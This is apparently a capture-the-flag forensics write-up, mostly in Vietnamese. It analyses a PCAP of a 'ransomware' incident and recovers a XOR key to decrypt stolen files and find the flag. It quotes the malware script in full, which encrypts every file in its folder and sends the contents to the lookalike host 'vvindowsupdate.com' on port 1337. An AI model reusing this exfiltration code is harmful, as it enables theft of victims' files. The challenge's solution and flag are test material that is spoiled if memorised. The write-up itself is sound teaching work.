## Description
- We received a plea for help from a rather frustrated looking employee. He said he accidently ran malware on his computer, but when he tried to pay the "leet hacker" to get his files back they said the malware was "broken"... best IT could do was provide us a PCAP.
## Link challenge 
> https://drive.google.com/drive/folders/1rO_bMD8G7T2ay9mOKOarXLp3uBuC6_VH?usp=sharing
## Solution
- Em tải xuống và nhận được 1 file pcapng. Mở lên với wireshark.
- Dõi theo luồng tcp em xác định được hacker đã chạy 1 tệp `rans.py` và mã hoá dữ liệu 
```
import socket
import base64
import os
from random import randbytes
from pwn import xor

# DON'T FORGET TO CHANGE THIS TO THE REAL KEY!!!!
key = randbytes(32)

def encrypt(filename):
    f = open(filename, 'rb')
    data = f.read()
    f.close()
   
    encrypted = xor(data, key)
    return encrypted

def send_encrypted(filename):
    print(f'sending {filename}')
    data = encrypt(filename)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall((f'Sending: {filename}').encode())
    s.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall(data)
    s.close()

def get_all_files():
    file_paths = []
    for root, dirs, files in os.walk(os.path.dirname(os.path.realpath(__file__))):
        for file in files:
            file_paths.append(os.path.join(root, file))
    file_paths.remove(__file__)      
    return file_paths

files = get_all_files()
for f in files:
    send_encrypted(f)
    #os.remove(f)
``` 
<details>
<summary>
- Phân tích script
</summary>

- Đầu tiên script tạo 1 key ngẫu nhiên gồm 32 byte `key = randbytes(32)`
- Tiếp theo chúng mã hoá xor file với key `encrypted = xor(data, key)`

</details>

- Theo dõi tiếp vài luồng nữa thì thấy có tên tệp được mã hoá và dữ liệu sau khi mã hoá và gửi đến máy hacker. 
- ![image](image/1.PNG)
- ![image](image/2.PNG)
- Như phân tích ở trên để khôi phục về ban đầu trước hết ta phải tìm key.
- Ý tưởng của em là xor magic byte với key để suy ngược ra key, tuy nhiên magic byte của file zip và file png chỉ có 2 đến 6 byte, trong khi đó key của ta có đến 32 byte.
- Tìm kiếm 1 hồi em tìm thấy 1 file `Sending: /home/davey/Documents/.ssh/id_rsa.pub` có magic byte khả quan hơn 1 tí `2D 2D 2D 2D 2D 42 45 47 49 4E 20 53 53 48 32 20 4B 45 59 2D 2D 2D 2D 2D`.
- Viết 1 script nhỏ để tìm key
```
from pwn import *

A = b"-----BEGIN OPENSSH PRIVATE KEY-----"
enc = "afef7e7da6970900eeab4da38833fb85f76fe6155b4224a0ed341369bbb87474afef7e5ae9e60e2bc58b2396b93584a4fe7fad316d6137a0f8307263bca66c2fe0af0611ca940d02c58854998227f497e5668704484a33a3f830726092961818c383372ae8e72b33c48b67a2b037f497e566b100484a23a0f8306a67bf99681ab38f6a1effaf7e0c96842ebf8b40d080d37ea110435824a6cf28031686ca680eda946b29dcad191defb400a2e91dfee3972daf775a42278a9224470d86d42117ebb41c33d299023ff68d21839b1bc39fe77eb73d262441afec167154cf830c3fcdf5352ac7803876ceb4178aee4281b3954fe9137d5a348ab3205a6d95857635d2883629fca10b06e5974685b60fd3a0d57fae3c3d5e01b1f80276169885292eb7862563d9800600caae14a5950f818cec70f335444a0797f7276b5b9bb92c53c5f62a1ddaa72210909d0399a01dc5a5c8669e334f3c3da8961f59518ca06d31c0872434dba47b31ebbc5bbf9024efb9e55fa03c674735b1c13c627088a20b1ec79b301fbafe461de69f19a2b007ccb0d7408075516547a9c8175f66cd853c2ee7bb353cb9e42f32f5d109868835e492e96883234b794088fb074657d1a26b16d1b41503c9ac3826fd9f01a4ec7cd0e7d312f40c437a40a5f71d50738a8e2e28f6ab1005ffb17973ead628aeb704ece6fc69807c446a08aeff475c4e87946b0ea98e2333d99c0a7095d455bca120fa8ec9539112035237d5cb07774f98893e38ed930004ffb9233dd6ad1ad8bb2f87a3e57d903f26400083f51362109f901b32bafb1e17c5a41d2c88922095ef4fe49f93458f3d5c472bd3ec1a5628acb73b0acaa5361ec6842976fd885eb8b146dbb1d160f515387f03b0c910604587882a30d2ad633aca940d01cca725bfbf1fd68494488f2b484a33a0fb427d589fa26820e1f05915ca940d00e5a420888902e186f045a57c607f2586d21a464c92821e10c481063cd9a77e09e8a80b988e1a84b0e94bb5134e5942abd31569618b856d2de9ab151adbb900219fef088f8c2fc7acca60853f6a5e3bb28f30435087a03412f1a47c69f1830506c5dc3add900cc0e59c5ef7096d5219ac8a5a466db695003fb3a00612d190052dd7ad0bd98c0feda5ae548a176e4a13ced6010b4cc9d7356de1b7151ccfa20005e8ad5e8dbb39e4e19d1790065b7b1b92d0357e57b9b3682ce396121cf9af1a119f8b01dbb003f8bce16cf3747c3328eb8e0269699cab081fb5ba362ae285797390ae1aa39127e79bec73f0303e7240aed21903759fa01401bab22a28e1ed1802e2871a878a1ef29ee053a028584645b5e010404cc9a8531be684667bd9e32272f6dc5eb4ab3ec6b89143b21d456017a9e00b4449bf9b1d31cab53269e4b22e70d5931a98b21dc7aef140a5375e6611d4eb5a7b569dae3d30c1a32737f1df161fe2a90ca19304ecb1c86b9e206c4f3c99f8107810b0a7230be4961423f1bd2936ed861f98b400dce0fc6295076c320687fd495f7692d42b0feeaf111fc0e23b72c9d134abd207f093cf109c24443d1ad9f639746c8c861e0fe1ed2a21b9ac7e77e9881c8b8226e582e64da72e435b4aa5f4041c77bdae6b20cf941062c5b9060fccb33adcb042fdbcf0628e4f7d5c289589454768caad312df8fb3131e09e1b2cc8a8029e911c8398ed508704484a3fa3f8307663bfa01e18ccba6114f3b37e0edfd107aea81cd6e09052e921704d2789f43c396d95b52b61e5903a1afcb6742fd09d1ea2e046f4bec85ea72f6d483ca08a17711b97873118d7a13b15cf857e16c6d423a3e107cfbce86eb714603b4095f32645129fb6280bf8c8251ccee27f76d08e0adc9b4180bfef5ea70344390489f4185941cc963a68cbb81b26c1e13f16c0a405998001f1bdc576ed6e707e31a3e9140063938c186dc0aa3c15ceaf2931ad9c009c9d3986b1dd43b608227b08d896375e1084b10333b2bb161cb2e5060cce8d18828017d7e7d25fa52e7e4a18a4df197563add03814cda41504c2833c35d3925adab507d4dcde0cf7167f460aa3925e186686a81560e0ac251fbf87361df0a6559a8d19c0e2fe11e93d5b683a9b8d3d52098eca6f69b2830127c7a33a25ff8705aeb45dfeafe571f3713b5278aee14261769faf1c3cc9a12b37bda63b24c8822bbba93fc7b5c655b227504830b48b25670d8fb7173fdaa41708df947a70d7815aafb930e0b0f35ff1273b33119bed376a13b1eb0a09c4862005c1bd0d03f6a3548abf40c6e0e27da22f60241789ff36626c9fa30912e3af1b38bbaf3d2ef5a035ba8c11f2ef936983035e673493e1286210d5922f18c5b0061581ad240d908417c7af06d1b3e012a211414c3fabd53b604ab5b6102cbaa83112c7b91a3ff6dc2383bb06c09fc956ac2c6b4f5da296260209bfab3428ba883539de832006e6a42ce6af31d09ef554f3167d443888d1300a16afd60b1af4922303e5a52e37c9af0ad5ac25c59cf77381356b7d37d1d1174316ce82093edbf56308b9af2a2c95d63a869e27d4bdd56bcc73627b0786892774749baf0b23fbac177fcf973e0eced142af8b30c3e5ee6a8e3d677a1d88db12184e96ac0b1cb68f0338d38c020d95b217b9e832c6958b4392766d6d1cb8f57b766d9399352ecb80783be4bd062bc2b55edc9301e5e1e652a9356d333ab6fc475776a6d13b6dc1f3353ffd98073f9eb50fd9ac05c2f9de42a014643f00d4d3084969a98d290888b23127fcbf032bd7865f9fa833ecb5ec52b3004f5e2699da097f12a888363ac18c2209c8992b33f7ac219d8d2cccf9c3668704444e33d1ea031840b39b760ff5871e24c892254dd0835b838e3fc2afcf65f616224545b3fb0571518db32931b68d6232fea32600f68329adb01efce7936e8f117b4c4aaaf116766fb3a33136d7906b1bce992000cddd2bdc8159bfe0ec6df46e714d18a2c84005699db56a0fc58b3724db93632490870b98883b8499ef179f3d387e45848a297f75cdaa1409f8a61161dca7203ecc845a9e9c1bd1a1e86ef1374e0116b289206a768cd72e61bbf30a34b3801b7fefd33ea38019fe8fd64bf135503b258be9010b7b93b96e35a991091fbeb00609ffa901808b59e587f56ead74306a17a58d025a53f4b0692dd7ed3e19ceb90077d3d729bd9727c6aec04ebe3365583997d4344563bfa0182ed3862968dba12b2ee49d5c80884ff18cce1e8309474815b8d7365e4ebfd02838cea41b5ae5941a2fd2945abeb10cd399e7768c15655a0aacf3306966a7873c2bfbb31423f9907812c5a10cabe91fdfb1dd5d9f2e3a4443adf435541bb7842b2ff5f52a67c5ba2a14919767858840d49bf64ca016423a2084f820016cd183172cb4a32518ca800320d09228baab07e290fc4db7316a433684f83c5561c6d63d6fb0ac611bbda03b2d908b21a8ac1ad2e6d42dac16666a3cd3f744181284890d76b7f30464fa9b25099e81379ce1388daefe4d8132677c4799925e431489881508f8ac157fd29d0b2ffe9f0999b110849ecf10b5283c3a4bacb3175441aea92003b38e0104e0e50d06e6a438b69f30878cfc4b87215e414383d723026ea9b3353ab0b66332b8940e06c0a828ae892ffddc890aeb68244e3ca5993e6367b0b20a11a2920119dd94180287ae28b5f55b98fb892d"
enc = bytes.fromhex(enc)
key = xor(A, enc)[:32]
print(key)
```
- Giá trị biến enc là giá trị raw của file lấy từ wireshark
> Key là `\x82\xc2SP\x8b\xd5LG\xa7\xe5m\xec\xd8v\xb5\xd6\xa4\'\xc6E\t\x0br\xe1\xb9q3"\xfe\xe1YY`
- Tiếp theo giải mã file từ key 
```
import base64
import os
from pwn import xor

# The key used for encryption
key = b"\x82\xc2SP\x8b\xd5LG\xa7\xe5m\xec\xd8v\xb5\xd6\xa4'\xc6E\t\x0br\xe1\xb9q3\"\xfe\xe1YY"

def decrypt(data):
    # Decrypt data using the same XOR key
    decrypted = xor(data, key)
    return decrypted

def hex_to_bytes(hex_data):
    # Convert hex-encoded data back to bytes
    return bytes.fromhex(hex_data)

def decrypt_file(encrypted_filename, decrypted_filename):
    with open(encrypted_filename, 'r') as f:
        hex_data = f.read().strip()
    
    # Convert hex data to bytes
    encrypted_data = hex_to_bytes(hex_data)
    
    # Decrypt the data
    decrypted_data = decrypt(encrypted_data)
    
    # Write the decrypted data to the new file
    with open(decrypted_filename, 'wb') as f:
        f.write(decrypted_data)

# Example usage
# Replace 'encrypted_file.txt' with the actual encrypted file name
# Replace 'decrypted_file' with the desired output file name
decrypt_file('file_encrypt', 'decrypted_file.txt')
                                                   
```
- Em thu được 1 file pdf chứa mật khẩu và 1 file zip được nén bằng mật khẩu, mở ra là có flag
> flag{c95c4ff18b0eb88123de779051a7a24f}